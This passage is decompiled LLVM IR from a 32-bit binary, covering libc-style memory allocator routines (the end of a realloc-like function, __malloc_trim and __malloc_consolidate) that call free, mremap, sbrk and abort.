dec_label_pc_804c6e4:                             ; preds = %dec_label_pc_804c6c7, %dec_label_pc_804c6b6, %dec_label_pc_804c69d, %dec_label_pc_804c68c, %dec_label_pc_804c6d8
  %v0_804c6e7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c6e7 = add i32 %v0_804c6e7, 8
  store i32 %v1_804c6e7, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_804c6ee = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_804c814

dec_label_pc_804c6f8:                             ; preds = %dec_label_pc_804c5b9, %dec_label_pc_804c66f, %dec_label_pc_804c63d
  %v1_804c709 = phi i32 [ %v1_804c5a9, %dec_label_pc_804c5b9 ], [ %v2_804c676, %dec_label_pc_804c66f ], [ %v0_804c6f8.pre, %dec_label_pc_804c63d ]
  %v5_804c6fa = sub i32 %v1_804c709, %stack_var_-40.0
  store i32 %v5_804c6fa, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_804c6fa, 16
  br i1 %tmp24, label %dec_label_pc_804c703, label %dec_label_pc_804c715

dec_label_pc_804c703:                             ; preds = %dec_label_pc_804c6f8
  %v0_804c703 = load i32, i32* @edi, align 4
  %v1_804c703 = add i32 %v0_804c703, 4
  %v2_804c703 = inttoptr i32 %v1_804c703 to i32*
  %v3_804c703 = load i32, i32* %v2_804c703, align 4
  %v1_804c706 = urem i32 %v3_804c703, 2
  %v2_804c709 = or i32 %v1_804c706, %v1_804c709
  store i32 %v2_804c709, i32* %eax.global-to-local, align 4
  store i32 %v2_804c709, i32* %v2_804c703, align 4
  %v0_804c70e = load i32, i32* @edi, align 4
  %v1_804c70e = load i32, i32* @ebx, align 4
  %v2_804c70e = add i32 %v0_804c70e, 4
  %v3_804c70e = add i32 %v2_804c70e, %v1_804c70e
  %v4_804c70e = inttoptr i32 %v3_804c70e to i32*
  %v5_804c70e = load i32, i32* %v4_804c70e, align 4
  %v6_804c70e = or i32 %v5_804c70e, 1
  store i32 %v6_804c70e, i32* %v4_804c70e, align 4
  br label %dec_label_pc_804c745

dec_label_pc_804c715:                             ; preds = %dec_label_pc_804c6f8
  %v0_804c719 = load i32, i32* @edi, align 4
  %v2_804c719 = add i32 %v0_804c719, %stack_var_-40.0
  store i32 %v2_804c719, i32* %eax.global-to-local, align 4
  %v1_804c71c = add i32 %v0_804c719, 4
  %v2_804c71c = inttoptr i32 %v1_804c71c to i32*
  %v3_804c71c = load i32, i32* %v2_804c71c, align 4
  %v1_804c71f = urem i32 %v3_804c71c, 2
  %v5_804c722 = or i32 %v1_804c71f, %stack_var_-40.0
  store i32 %v5_804c722, i32* %v2_804c71c, align 4
  %v0_804c72c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c72e = or i32 %v0_804c72c, 1
  store i32 %v1_804c72e, i32* @edx, align 4
  %v1_804c731 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c731 = add i32 %v1_804c731, 4
  %v3_804c731 = inttoptr i32 %v2_804c731 to i32*
  store i32 %v1_804c72e, i32* %v3_804c731, align 4
  %v0_804c734 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c734 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c734 = add i32 %v0_804c734, 4
  %v3_804c734 = add i32 %v2_804c734, %v1_804c734
  %v4_804c734 = inttoptr i32 %v3_804c734 to i32*
  %v5_804c734 = load i32, i32* %v4_804c734, align 4
  %v6_804c734 = or i32 %v5_804c734, 1
  store i32 %v6_804c734, i32* %v4_804c734, align 4
  %v0_804c739 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c739 = add i32 %v0_804c739, 8
  store i32 %v1_804c739, i32* %eax.global-to-local, align 4
  store i32 %v1_804c739, i32* %stack_var_-60, align 4
  %v1_804c73d = call i32 @free(i32 %v1_804c739)
  store i32 %v1_804c73d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c745

dec_label_pc_804c745:                             ; preds = %dec_label_pc_804c703, %dec_label_pc_804c715
  %v0_804c745 = load i32, i32* @edi, align 4
  %v1_804c745 = add i32 %v0_804c745, 8
  store i32 %v1_804c745, i32* @ebx, align 4
  br label %dec_label_pc_804c821

dec_label_pc_804c74d:                             ; preds = %dec_label_pc_804c59d
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_804c751 = load i32, i32* @global_var_8056d9c.348, align 4
  %v1_804c756 = add i32 %v0_804c751, -1
  store i32 %v1_804c756, i32* %eax.global-to-local, align 4
  %v2_804c75b = inttoptr i32 %v1_804c5a1 to i32*
  %v3_804c75b = load i32, i32* %v2_804c75b, align 4
  store i32 %v3_804c75b, i32* @ebp, align 4
  %v1_804c75e = or i32 %stack_var_-40.0, 4
  store i32 %v1_804c75e, i32* %stack_var_-44, align 4
  %v2_804c764 = add i32 %v3_804c75b, %v1_804c756
  store i32 %v2_804c764, i32* @edx, align 4
  %v1_804c767 = sub i32 0, %v0_804c751
  store i32 %v1_804c767, i32* %eax.global-to-local, align 4
  %v2_804c769 = add i32 %v2_804c764, %v1_804c75e
  %v2_804c76c = and i32 %v2_804c769, %v1_804c767
  store i32 %v2_804c76c, i32* @esi, align 4
  %v2_804c770 = sub i32 %v2_804c76c, %v3_804c75b
  store i32 %v2_804c770, i32* @ebx, align 4
  %v15_804c772 = icmp eq i32 %v1_804c5a9, %v2_804c770
  br i1 %v15_804c772, label %dec_label_pc_804c81d, label %dec_label_pc_804c77c

dec_label_pc_804c77c:                             ; preds = %dec_label_pc_804c74d
  %v2_804c783 = sub i32 %v1_804c5a1, %v3_804c75b
  store i32 %v2_804c783, i32* @edi, align 4
  %v2_804c785 = add i32 %v3_804c75b, %v1_804c5a9
  store i32 %v2_804c785, i32* %eax.global-to-local, align 4
  store i32 %v2_804c783, i32* %stack_var_-60, align 4
  %v6_804c789 = call i32 @mremap(i32 %v2_804c783, i32 %v2_804c785, i32 %v2_804c76c, i32 1, i32 %v1_804c75e, i32 %v1_804c5a9)
  store i32 %v6_804c789, i32* %eax.global-to-local, align 4
  %v10_804c791 = icmp eq i32 %v6_804c789, -1
  br i1 %v10_804c791, label %dec_label_pc_804c7d5, label %dec_label_pc_804c796

dec_label_pc_804c796:                             ; preds = %dec_label_pc_804c77c
  %v1_804c796 = load i32, i32* @ebp, align 4
  %v2_804c796 = add i32 %v1_804c796, %v6_804c789
  store i32 %v2_804c796, i32* @edx, align 4
  %v0_804c799 = load i32, i32* @ebx, align 4
  %v1_804c799 = or i32 %v0_804c799, 2
  store i32 %v1_804c799, i32* %ebx.global-to-local, align 4
  %v0_804c79c = load i32, i32* @esi, align 4
  store i32 %v0_804c79c, i32* %eax.global-to-local, align 4
  %v2_804c79e = add i32 %v2_804c796, 4
  %v3_804c79e = inttoptr i32 %v2_804c79e to i32*
  store i32 %v1_804c799, i32* %v3_804c79e, align 4
  %v0_804c7a1 = load i32, i32* %eax.global-to-local, align 4
  %v5_804c7a1 = sub i32 %v0_804c7a1, %v1_804c5a9
  %v1_804c7a5 = load i32, i32* @global_var_8056da4.353, align 4
  %v2_804c7a5 = add i32 %v1_804c7a5, %v5_804c7a1
  store i32 %v2_804c7a5, i32* %eax.global-to-local, align 4
  store i32 %v2_804c7a5, i32* @global_var_8056da4.353, align 4
  %v1_804c7b0 = load i32, i32* @global_var_8056db0.354, align 16
  %tmp25 = icmp ugt i32 %v2_804c7a5, %v1_804c7b0
  br i1 %tmp25, label %dec_label_pc_804c7b8, label %dec_label_pc_804c7bd

dec_label_pc_804c7b8:                             ; preds = %dec_label_pc_804c796
  store i32 %v2_804c7a5, i32* @global_var_8056db0.354, align 16
  br label %dec_label_pc_804c7bd

dec_label_pc_804c7bd:                             ; preds = %dec_label_pc_804c796, %dec_label_pc_804c7b8
  %v1_804c7bd = load i32, i32* @global_var_8056da8.355, align 8
  %v2_804c7bd = add i32 %v1_804c7bd, %v2_804c7a5
  store i32 %v2_804c7bd, i32* %eax.global-to-local, align 4
  %v1_804c7c3 = load i32, i32* @global_var_8056db4.356, align 4
  %tmp26 = icmp ugt i32 %v2_804c7bd, %v1_804c7c3
  br i1 %tmp26, label %dec_label_pc_804c7cb, label %dec_label_pc_804c7d0

dec_label_pc_804c7cb:                             ; preds = %dec_label_pc_804c7bd
  store i32 %v2_804c7bd, i32* @global_var_8056db4.356, align 4
  br label %dec_label_pc_804c7d0

dec_label_pc_804c7d0:                             ; preds = %dec_label_pc_804c7bd, %dec_label_pc_804c7cb
  %v0_804c7d0 = load i32, i32* @edx, align 4
  %v1_804c7d0 = add i32 %v0_804c7d0, 8
  store i32 %v1_804c7d0, i32* @ebx, align 4
  br label %dec_label_pc_804c821

dec_label_pc_804c7d5:                             ; preds = %dec_label_pc_804c77c
  %v2_804c7d5 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_804c7d5, i32* %eax.global-to-local, align 4
  %v10_804c7d8 = icmp ult i32 %v1_804c5a9, %v2_804c7d5
  %v1_804c7dc = icmp eq i1 %v10_804c7d8, false
  br i1 %v1_804c7dc, label %dec_label_pc_804c81d, label %dec_label_pc_804c7de

dec_label_pc_804c7de:                             ; preds = %dec_label_pc_804c7d5
  %v1_804c7e5 = add i32 %stack_var_-40.0, -7
  store i32 %v1_804c7e5, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7e5, i32* %stack_var_-60, align 4
  %v1_804c7e9 = call i32 @malloc(i32 %v1_804c7e5)
  store i32 %v1_804c7e9, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7e9, i32* @ebx, align 4
  %v1_804c7f3 = icmp eq i32 %v1_804c7e9, 0
  br i1 %v1_804c7f3, label %dec_label_pc_804c819, label %dec_label_pc_804c7f7

dec_label_pc_804c7f7:                             ; preds = %dec_label_pc_804c7de
  %v1_804c7fc = add i32 %v1_804c5a9, -8
  store i32 %v1_804c7fc, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7e9, i32* %stack_var_-60, align 4
  %v3_804c805 = inttoptr i32 %v1_804c7e9 to i16*
  %v4_804c805 = call i32 @memcpy(i16* %v3_804c805, i32 %tmp7, i32 %v1_804c7fc)
  store i32 %v4_804c805, i32* %eax.global-to-local, align 4
  store i32 %v1_804c7e9, i32* @edx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_804c80f = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_804c814

dec_label_pc_804c814:                             ; preds = %dec_label_pc_804c6e4, %dec_label_pc_804c7f7
  %storemerge = phi i32 [ %v1_804c80f, %dec_label_pc_804c7f7 ], [ %v1_804c6ee, %dec_label_pc_804c6e4 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c821

dec_label_pc_804c819:                             ; preds = %dec_label_pc_804c7de, %dec_label_pc_804c648
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804c821

dec_label_pc_804c81d:                             ; preds = %dec_label_pc_804c7d5, %dec_label_pc_804c74d, %dec_label_pc_804c5e7
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_804c821

dec_label_pc_804c821:                             ; preds = %dec_label_pc_804c819, %dec_label_pc_804c814, %dec_label_pc_804c7d0, %dec_label_pc_804c745, %dec_label_pc_804c81d
  store i32 %v2_804c556, i32* @eax, align 4
  store i32 %v2_804c556, i32* %stack_var_-60, align 4
  %v2_804c82a = call i32 @__pthread_return_void(i32 %v2_804c556, i32 1)
  store i32 %v2_804c82a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c82f

dec_label_pc_804c82f:                             ; preds = %dec_label_pc_804c53a, %dec_label_pc_804c526, %dec_label_pc_804c821
  br label %dec_label_pc_804c832

dec_label_pc_804c832:                             ; preds = %dec_label_pc_804c574, %dec_label_pc_804c82f
  %v0_804c835 = load i32, i32* @ebx, align 4
  store i32 %v0_804c835, i32* %eax.global-to-local, align 4
  store i32 %v0_804c517, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c516, i32* @esi, align 4
  ret i32 %v0_804c835

; uselistorder directives
  uselistorder i32 %v1_804c7e9, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_804c7bd, { 1, 0, 2 }
  uselistorder i32 %v2_804c7a5, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804c783, { 1, 0, 2 }
  uselistorder i32 %v1_804c75e, { 1, 0, 2 }
  uselistorder i32 %v3_804c75b, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804c719, { 1, 0 }
  uselistorder i32 %v1_804c67f, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804c653, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_804c5f7, { 1, 0, 2 }
  uselistorder i32 %v3_804c60a, { 0, 2, 1 }
  uselistorder i32 %v2_804c5c7, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_804c5a9, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_804c5a1, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_804c596, { 1, 0 }
  uselistorder i32 %v1_804c586, { 0, 2, 1 }
  uselistorder i32 %v0_804c56f, { 1, 0 }
  uselistorder i32 %v2_804c556, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804c832, { 1, 0 }
  uselistorder label %dec_label_pc_804c82f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c821, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804c814, { 1, 0 }
  uselistorder label %dec_label_pc_804c7d0, { 1, 0 }
  uselistorder label %dec_label_pc_804c7bd, { 1, 0 }
  uselistorder label %dec_label_pc_804c745, { 1, 0 }
  uselistorder label %dec_label_pc_804c6f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c6e4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804c63d, { 1, 0 }
  uselistorder label %dec_label_pc_804c59d, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_804c843 = load i32, i32* @edx, align 4
  store i32 %v0_804c843, i32* %ebp.global-to-local, align 4
  %v1_804c845 = add i32 %v0_804c843, 860
  %v2_804c845 = inttoptr i32 %v1_804c845 to i32*
  %v3_804c845 = load i32, i32* %v2_804c845, align 4
  store i32 %v3_804c845, i32* @ecx, align 4
  %v1_804c84b = add i32 %v0_804c843, 44
  %v2_804c84b = inttoptr i32 %v1_804c84b to i32*
  %v3_804c84b = load i32, i32* %v2_804c84b, align 4
  %v1_804c84e = add i32 %v3_804c84b, 4
  %v2_804c84e = inttoptr i32 %v1_804c84e to i32*
  %v3_804c84e = load i32, i32* %v2_804c84e, align 4
  %v1_804c851 = and i32 %v3_804c84e, -4
  store i32 %v1_804c851, i32* @esi, align 4
  %v1_804c856 = load i32, i32* @eax, align 4
  %v2_804c856 = add i32 %v3_804c845, -17
  %v2_804c858 = add i32 %v2_804c856, %v1_804c851
  %v3_804c858 = sub i32 %v2_804c858, %v1_804c856
  %div = udiv i32 %v3_804c858, %v3_804c845
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804c858, %v3_804c845
  store i32 %tmp10, i32* @edx, align 4
  %v1_804c860 = add i32 %div, -1
  %v4_804c863 = mul i32 %v1_804c860, %v3_804c845
  store i32 %v4_804c863, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804c863, 1
  br i1 %tmp11, label %dec_label_pc_804c8bf, label %dec_label_pc_804c86a

dec_label_pc_804c86a:                             ; preds = %entry
  %v1_804c86f = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804c86f, i32* %edi.global-to-local, align 4
  %v0_804c876 = load i32, i32* @esi, align 4
  store i32 %v0_804c876, i32* %eax.global-to-local, align 4
  %v1_804c878 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804c878 = add i32 %v1_804c878, 44
  %v3_804c878 = inttoptr i32 %v2_804c878 to i32*
  %v4_804c878 = load i32, i32* %v3_804c878, align 4
  %v5_804c878 = add i32 %v4_804c878, %v0_804c876
  store i32 %v5_804c878, i32* %eax.global-to-local, align 4
  %v12_804c87e = icmp eq i32 %v1_804c86f, %v5_804c878
  %v1_804c880 = icmp eq i1 %v12_804c87e, false
  br i1 %v1_804c880, label %dec_label_pc_804c8bf, label %dec_label_pc_804c882

dec_label_pc_804c882:                             ; preds = %dec_label_pc_804c86a
  %v1_804c885 = sub i32 0, %v4_804c863
  store i32 %v1_804c885, i32* @ebx, align 4
  %v1_804c888 = call i32 @__GI_sbrk(i32 %v1_804c885)
  store i32 %v1_804c888, i32* %eax.global-to-local, align 4
  %v1_804c894 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804c894, i32* %eax.global-to-local, align 4
  %v10_804c89c = icmp eq i32 %v1_804c894, -1
  br i1 %v10_804c89c, label %dec_label_pc_804c8bf, label %dec_label_pc_804c8a1

dec_label_pc_804c8a1:                             ; preds = %dec_label_pc_804c882
  %v0_804c8a1 = load i32, i32* %edi.global-to-local, align 4
  %v2_804c8a3 = sub i32 %v0_804c8a1, %v1_804c894
  %v12_804c8a3 = icmp eq i32 %v2_804c8a3, 0
  store i32 %v2_804c8a3, i32* @ecx, align 4
  br i1 %v12_804c8a3, label %dec_label_pc_804c8bf, label %dec_label_pc_804c8a7

dec_label_pc_804c8a7:                             ; preds = %dec_label_pc_804c8a1
  %v0_804c8a7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804c8a7 = add i32 %v0_804c8a7, 44
  %v2_804c8a7 = inttoptr i32 %v1_804c8a7 to i32*
  %v3_804c8a7 = load i32, i32* %v2_804c8a7, align 4
  store i32 %v3_804c8a7, i32* %eax.global-to-local, align 4
  %v1_804c8aa = add i32 %v0_804c8a7, 872
  %v2_804c8aa = inttoptr i32 %v1_804c8aa to i32*
  %v3_804c8aa = load i32, i32* %v2_804c8aa, align 4
  %v5_804c8aa = sub i32 %v3_804c8aa, %v2_804c8a3
  store i32 %v5_804c8aa, i32* %v2_804c8aa, align 4
  %v0_804c8b0 = load i32, i32* @esi, align 4
  %v1_804c8b0 = load i32, i32* @ecx, align 4
  %v2_804c8b0 = sub i32 %v0_804c8b0, %v1_804c8b0
  %v1_804c8b2 = or i32 %v2_804c8b0, 1
  %v1_804c8b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c8b5 = add i32 %v1_804c8b5, 4
  %v3_804c8b5 = inttoptr i32 %v2_804c8b5 to i32*
  store i32 %v1_804c8b2, i32* %v3_804c8b5, align 4
  br label %dec_label_pc_804c8c1

dec_label_pc_804c8bf:                             ; preds = %dec_label_pc_804c8a1, %dec_label_pc_804c882, %dec_label_pc_804c86a, %entry
  br label %dec_label_pc_804c8c1

dec_label_pc_804c8c1:                             ; preds = %dec_label_pc_804c8a7, %dec_label_pc_804c8bf
  %storemerge = phi i32 [ 1, %dec_label_pc_804c8a7 ], [ 0, %dec_label_pc_804c8bf ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804c894, { 1, 0, 2 }
  uselistorder i32 %v4_804c863, { 1, 2, 0 }
  uselistorder i32 %v3_804c845, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_804c8c1, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804c8ca = load i32, i32* @edi, align 4
  %v0_804c8cb = load i32, i32* @esi, align 4
  %v0_804c8cc = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804c8d4 = load i32, i32* %arg1, align 4
  store i32 %v2_804c8d4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804c8db = icmp eq i32 %v2_804c8d4, 0
  br i1 %v1_804c8db, label %dec_label_pc_804ca04.preheader, label %dec_label_pc_804c8e3

dec_label_pc_804ca04.preheader:                   ; preds = %entry
  %v3_804c9f9 = add i32 %tmp11, 44
  br label %dec_label_pc_804c9f5

dec_label_pc_804c8e3:                             ; preds = %entry
  %v1_804c8e7 = and i32 %v2_804c8d4, -3
  store i32 %v1_804c8e7, i32* %arg1, align 4
  %v1_804c8ec = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804c8f7 = add i32 %tmp11, 4
  store i32 %v1_804c8f7, i32* %eax.global-to-local, align 4
  %v2_804c902 = load i32, i32* %arg1, align 4
  %v2_804c908 = udiv i32 %v2_804c902, 8
  %v2_804c90b = mul nuw i32 %v2_804c908, 4
  %v3_804c90b = add i32 %tmp11, -4
  %v4_804c90b = add i32 %v3_804c90b, %v2_804c90b
  store i32 %v4_804c90b, i32* %eax.global-to-local, align 4
  %v2_804c9d2 = add i32 %tmp11, 44
  %v3_804c9d2 = inttoptr i32 %v2_804c9d2 to i32*
  %v1_804c9a5 = add i32 %tmp11, 60
  %v2_804c9a5 = inttoptr i32 %v1_804c9a5 to i32*
  br label %dec_label_pc_804c913

dec_label_pc_804c913:                             ; preds = %dec_label_pc_804c9eb, %dec_label_pc_804c8e3
  %v0_804c921 = phi i32 [ %v1_804c8f7, %dec_label_pc_804c8e3 ], [ %v4_804c9eb, %dec_label_pc_804c9eb ]
  store i32 %v0_804c921, i32* %eax.global-to-local, align 4
  %v1_804c917 = inttoptr i32 %v0_804c921 to i32*
  %v2_804c917 = load i32, i32* %v1_804c917, align 4
  store i32 %v2_804c917, i32* @ecx, align 4
  %v1_804c919 = icmp eq i32 %v2_804c917, 0
  br i1 %v1_804c919, label %dec_label_pc_804c9e1, label %dec_label_pc_804c921

dec_label_pc_804c921:                             ; preds = %dec_label_pc_804c913
  store i32 0, i32* %v1_804c917, align 4
  %v0_804c927.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c927

dec_label_pc_804c927:                             ; preds = %dec_label_pc_804c9d5, %dec_label_pc_804c921
  %v0_804c944 = phi i32 [ %v3_804c927, %dec_label_pc_804c9d5 ], [ %v0_804c927.pre, %dec_label_pc_804c921 ]
  %v1_804c927 = add i32 %v0_804c944, 8
  %v2_804c927 = inttoptr i32 %v1_804c927 to i32*
  %v3_804c927 = load i32, i32* %v2_804c927, align 4
  store i32 %v3_804c927, i32* %edx.global-to-local, align 4
  %v1_804c92e = add i32 %v0_804c944, 4
  %v2_804c92e = inttoptr i32 %v1_804c92e to i32*
  %v3_804c92e = load i32, i32* %v2_804c92e, align 4
  store i32 %v3_804c92e, i32* %eax.global-to-local, align 4
  %v1_804c933 = and i32 %v3_804c92e, -2
  store i32 %v1_804c933, i32* @edi, align 4
  %v2_804c936 = urem i32 %v3_804c92e, 2
  %v3_804c936 = icmp eq i32 %v2_804c936, 0
  %v2_804c938 = add i32 %v1_804c933, %v0_804c944
  store i32 %v2_804c938, i32* @ebx, align 4
  %v1_804c93b = add i32 %v2_804c938, 4
  %v2_804c93b = inttoptr i32 %v1_804c93b to i32*
  %v3_804c93b = load i32, i32* %v2_804c93b, align 4
  store i32 %v3_804c93b, i32* %edx.global-to-local, align 4
  %v1_804c942 = icmp eq i1 %v3_804c936, false
  br i1 %v1_804c942, label %dec_label_pc_804c964, label %dec_label_pc_804c944

dec_label_pc_804c944:                             ; preds = %dec_label_pc_804c927
  %v1_804c944 = inttoptr i32 %v0_804c944 to i32*
  %v2_804c944 = load i32, i32* %v1_804c944, align 4
  store i32 %v2_804c944, i32* %ebp.global-to-local, align 4
  %v2_804c948 = sub i32 %v0_804c944, %v2_804c944
  store i32 %v2_804c948, i32* %eax.global-to-local, align 4
  %v1_804c94a = add i32 %v2_804c948, 8
  %v2_804c94a = inttoptr i32 %v1_804c94a to i32*
  %v3_804c94a = load i32, i32* %v2_804c94a, align 4
  store i32 %v3_804c94a, i32* @esi, align 4
  %v1_804c94d = add i32 %v2_804c948, 12
  %v2_804c94d = inttoptr i32 %v1_804c94d to i32*
  %v3_804c94d = load i32, i32* %v2_804c94d, align 4
  store i32 %v3_804c94d, i32* %edx.global-to-local, align 4
  %v1_804c950 = add i32 %v3_804c94a, 12
  %v2_804c950 = inttoptr i32 %v1_804c950 to i32*
  %v3_804c950 = load i32, i32* %v2_804c950, align 4
  store i32 %v3_804c950, i32* @ecx, align 4
  %v12_804c953 = icmp eq i32 %v3_804c950, %v2_804c948
  %v1_804c955 = icmp eq i1 %v12_804c953, false
  br i1 %v1_804c955, label %dec_label_pc_804c994, label %dec_label_pc_804c957

dec_label_pc_804c957:                             ; preds = %dec_label_pc_804c944
  %v1_804c957 = add i32 %v3_804c94d, 8
  %v2_804c957 = inttoptr i32 %v1_804c957 to i32*
  %v3_804c957 = load i32, i32* %v2_804c957, align 4
  %v15_804c957 = icmp eq i32 %v3_804c957, %v3_804c950
  %v1_804c95a = icmp eq i1 %v15_804c957, false
  br i1 %v1_804c95a, label %dec_label_pc_804c994, label %dec_label_pc_804c95c

dec_label_pc_804c95c:                             ; preds = %dec_label_pc_804c957
  %v2_804c95c = add i32 %v2_804c944, %v1_804c933
  store i32 %v2_804c95c, i32* @edi, align 4
  store i32 %v3_804c94d, i32* %v2_804c950, align 4
  %v0_804c961 = load i32, i32* @esi, align 4
  %v1_804c961 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c961 = add i32 %v1_804c961, 8
  %v3_804c961 = inttoptr i32 %v2_804c961 to i32*
  store i32 %v0_804c961, i32* %v3_804c961, align 4
  %v0_804c96f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c964

dec_label_pc_804c964:                             ; preds = %dec_label_pc_804c927, %dec_label_pc_804c95c
  %v1_804c978 = phi i32 [ %v2_804c938, %dec_label_pc_804c927 ], [ %v0_804c96f.pre, %dec_label_pc_804c95c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804c96c = and i32 %v3_804c93b, -4
  store i32 %v1_804c96c, i32* %ebp.global-to-local, align 4
  %v4_804c96f = load i32, i32* %v3_804c9d2, align 4
  %v15_804c96f = icmp eq i32 %v1_804c978, %v4_804c96f
  br i1 %v15_804c96f, label %dec_label_pc_804c9c5, label %dec_label_pc_804c974

dec_label_pc_804c974:                             ; preds = %dec_label_pc_804c964
  %v2_804c974 = add i32 %v1_804c978, 4
  %v3_804c974 = add i32 %v2_804c974, %v1_804c96c
  %v4_804c974 = inttoptr i32 %v3_804c974 to i32*
  %v5_804c974 = load i32, i32* %v4_804c974, align 4
  store i32 %v5_804c974, i32* %eax.global-to-local, align 4
  %v3_804c978 = inttoptr i32 %v2_804c974 to i32*
  store i32 %v1_804c96c, i32* %v3_804c978, align 4
  %v0_804c97b = load i32, i32* %eax.global-to-local, align 4
  %v1_804c97b = urem i32 %v0_804c97b, 2
  %v2_804c97b = icmp eq i32 %v1_804c97b, 0
  store i32 %v1_804c97b, i32* %eax.global-to-local, align 4
  %v1_804c980 = icmp eq i1 %v2_804c97b, false
  br i1 %v1_804c980, label %dec_label_pc_804c9a1, label %dec_label_pc_804c982

dec_label_pc_804c982:                             ; preds = %dec_label_pc_804c974
  %v0_804c982 = load i32, i32* @ebx, align 4
  %v1_804c982 = add i32 %v0_804c982, 8
  %v2_804c982 = inttoptr i32 %v1_804c982 to i32*
  %v3_804c982 = load i32, i32* %v2_804c982, align 4
  store i32 %v3_804c982, i32* @edx, align 4
  %v1_804c985 = add i32 %v0_804c982, 12
  %v2_804c985 = inttoptr i32 %v1_804c985 to i32*
  %v3_804c985 = load i32, i32* %v2_804c985, align 4
  store i32 %v3_804c985, i32* %eax.global-to-local, align 4
  %v1_804c988 = add i32 %v3_804c982, 12
  %v2_804c988 = inttoptr i32 %v1_804c988 to i32*
  %v3_804c988 = load i32, i32* %v2_804c988, align 4
  store i32 %v3_804c988, i32* @esi, align 4
  %v12_804c98b = icmp eq i32 %v3_804c988, %v0_804c982
  %v1_804c98d = icmp eq i1 %v12_804c98b, false
  br i1 %v1_804c98d, label %dec_label_pc_804c994, label %dec_label_pc_804c98f

dec_label_pc_804c98f:                             ; preds = %dec_label_pc_804c982
  %v1_804c98f = add i32 %v3_804c985, 8
  %v2_804c98f = inttoptr i32 %v1_804c98f to i32*
  %v3_804c98f = load i32, i32* %v2_804c98f, align 4
  %v15_804c98f = icmp eq i32 %v3_804c98f, %v3_804c988
  br i1 %v15_804c98f, label %dec_label_pc_804c999, label %dec_label_pc_804c994

dec_label_pc_804c994:                             ; preds = %dec_label_pc_804c98f, %dec_label_pc_804c982, %dec_label_pc_804c957, %dec_label_pc_804c944
  %v0_804c994 = call i32 @abort()
  store i32 %v0_804c994, i32* %eax.global-to-local, align 4
